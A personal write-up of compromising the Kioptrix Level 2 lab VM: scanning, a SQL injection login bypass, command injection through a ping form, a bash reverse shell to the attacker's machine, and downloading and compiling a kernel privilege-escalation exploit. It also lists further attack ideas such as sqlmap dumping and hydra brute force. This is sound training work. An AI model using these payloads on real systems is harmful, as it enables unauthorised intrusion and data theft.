# Kioptrix Level 2 – Writeup

**Target:** Kioptrix Level 2 (192.168.74.3)
**Attacker:** Kali Linux in UTM
**OS:** CentOS 4.5, Kernel 2.6.9-55.EL
**Difficulty:** Easy
**Attack Path:** SQL Injection → Command Injection → Kernel Exploit

---

## Recon

Gotta find the box first. Ran a ping sweep across the network:

```bash
export SCOPE=192.168.74.0/24
nmap -sn $SCOPE
```

Two hosts came up. 192.168.74.1 is just the gateway (UTM's virtual router, you can tell because the DHCP offer came from that IP during boot). 192.168.74.3 is our target.

Then a service scan to see what's running:

```bash
export RHOST=192.168.74.3
nmap -sV $RHOST
```

Found SSH on 22, Apache on 80 and 443, and MySQL on 3306. The web server is where the action is.

---

## SQL Injection

Hit the web server in the browser and there's a login form staring at us. Tried the classic SQL injection in the username field:

```
' OR 1=1 #
```

Password can be whatever, doesn't matter. And we're in. The `#` is a MySQL comment character so it chops off everything after it. What the app is probably doing under the hood:

```sql
SELECT * FROM users WHERE username='' OR 1=1 #' AND password='whatever'
```

`1=1` is always true so it returns every row. The password check never even runs because `#` comments it out. Classic.

---

## Command Injection

After the login there's a page that lets you ping an IP. Whenever you see something like that, first thing you try is sneaking in extra commands. Threw a pipe in there:

```
127.0.0.1 | id
```

Worked. We're running as `apache`. The server just takes whatever you type, slaps it into a shell command, and runs it. No filtering, no sanitization, nothing.

### Reverse Shell

A web form is annoying to work with so let's get a proper shell. Started a listener on Kali:

```bash
nc -lvnp 4444
```

Then in the ping field:

```
127.0.0.1 | bash -i >& /dev/tcp/192.168.73.2/4444 0>&1
```

Quick breakdown of what that actually does. `127.0.0.1 |` pings localhost and the pipe sends the output to the next command. `bash -i` fires up an interactive shell. `>& /dev/tcp/IP/PORT` redirects both stdout and stderr over TCP to our Kali box. `0>&1` sends stdin through the same connection. End result is the target connects back to us with a full shell. That's why it's called a reverse shell, the target reaches out to us instead of us connecting to it.

---

## Privilege Escalation

We're `apache` but we want root. Checked the kernel:

```bash
uname -a
# Linux kioptrix.level2 2.6.9-55.EL
```

That kernel is from 2006. Searched for known exploits:

```bash
searchsploit centos 4.5 privilege escalation
```

Found 9542.c, a privilege escalation exploit specifically for CentOS 4.4/4.5 with kernel 2.6. Exactly what we need.

Grabbed it:

```bash
searchsploit -m 9542
```

Started a quick web server on Kali so the target can pull the file:

```bash
cd ~
python3 -m http.server 8080
```

On the Kioptrix shell, downloaded it to /tmp (one of the few places we can write to as apache), compiled it, and ran it:

```bash
cd /tmp
wget http://192.168.73.2:8080/9542.c -O /tmp/9542.c
gcc 9542.c -o exploit
./exploit
```

```bash
whoami
# root
```

That's it. Root.

---

## Still on the List

I only went the web route this time (SQL injection into command injection into kernel exploit) but there's more stuff to poke at on this box.

**MySQL on 3306** is open and could be worth connecting to directly. If it accepts remote connections with weak creds you could dump the database, grab password hashes, or even write files to disk with `SELECT INTO OUTFILE`.

**SSH on 22** could be brute forced with hydra. Or if you get creds from the database dump you could just log in directly. Way cleaner than a reverse shell.

**sqlmap** against the login form would be interesting too. Instead of just bypassing the login with `' OR 1=1 #` you could use sqlmap to fully enumerate the database, dump all tables, and extract every password hash. That gives you way more info than just getting past the login screen.

**gobuster** on the web server to find hidden directories and files. There might be admin panels, backup files, or other pages that aren't linked from the main site.

**Other privilege escalation paths** besides the kernel exploit. Could check for SUID binaries with `find / -perm -4000`, look at cronjobs, check file permissions, or hunt for credentials in config files. There's usually more than one way to root.

Will come back and hit these when I get the chance.

---

## What I Learned

SQL injection on login forms is still one of the easiest wins out there. `' OR 1=1 #` for MySQL, `' OR 1=1 --` for other databases. Always worth trying.

Command injection shows up anywhere user input gets passed to system commands. Ping forms, DNS lookups, file upload handlers. If it interacts with the OS, try pipes and semicolons.

Reverse shells make way more sense to me now. It's just redirecting stdin, stdout, and stderr over a TCP connection. The `>&` means "both stdout and stderr" and `0>&1` chains stdin into the same pipe. The `&` in front of the number tells bash "this is a file descriptor, not a filename."

Old kernels are free root. If you see a kernel version from 2006, searchsploit will almost certainly have something for it. Download, compile, run, done.

Transferring files to a target is easiest with python's http server on your end and wget on the target. Just make sure you're running the server from the directory where the file actually is, otherwise you get a 404 and waste 10 minutes figuring out why.

*Educational purposes only. Don't run any of this on systems you don't own.*
